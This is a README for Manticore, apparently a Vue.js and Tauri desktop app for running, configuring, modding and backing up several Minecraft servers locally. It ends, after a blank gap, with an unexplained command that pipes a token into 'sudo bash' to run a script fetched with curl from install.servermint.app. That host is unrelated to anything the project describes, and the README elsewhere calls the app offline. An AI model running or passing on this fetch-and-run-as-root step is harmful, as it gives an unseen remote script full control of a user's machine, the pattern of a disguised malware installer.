Manticore — Minecraft Server Hub & Manager
What is Manticore?
Manticore is a desktop application designed to help Minecraft server owners and modders easily manage multiple Minecraft servers locally on their machine — all from one sleek, user-friendly interface.

Core features:
Multi-server management:
Run, monitor, and control multiple Minecraft servers at once without juggling command prompts or separate windows.

Inbuilt file explorer:
Browse server folders, config files, world saves, mods, and plugins directly inside the app — no need to open your file explorer separately.

One-click plugin/mod installation:
Download and install Minecraft mods and plugins easily from supported sources (like Modrinth, CurseForge) or from local files, and apply them to specific servers with a click.

Server start/stop/restart:
Launch or stop servers, view their console output and logs live inside the app, so you can monitor server status in real-time.

Config editor:
Edit important server configuration files (e.g., server.properties) within the app using a friendly UI or raw text editor.

Backup & restore:
Backup server worlds, mods, and configs to keep your servers safe — with easy restore options.

Why Manticore?
Streamlines server management by putting everything in one place, saving time and hassle.

Perfect for modded servers where installing and updating mods/plugins can be complex.

User-friendly UI built with modern web tech (Vue.js) combined with the power of native system access via Rust (Tauri).

Runs locally and offline, so your data stays private.

Tech stack:
Frontend: Vue.js (fast, reactive UI)

Backend: Rust via Tauri (native file & process management)

Packaging: Tauri bundles the app as a lightweight desktop executable for Windows/macOS/Linux

Example user workflow:
Open Manticore, see a list of your Minecraft servers.

Select a server, click "Start" to launch it — console output appears live.

Click "Mods & Plugins" tab, browse available mods, click "Install" on desired ones.

Edit server properties to tweak settings.

Backup your server world before major changes.

Stop the server when done or switch to managing a different one.

npx tauri dev



echo "e8d7579c-de61-4185-abe9-d32b28f77206" | sudo bash -c "$(curl -sSL https://install.servermint.app)"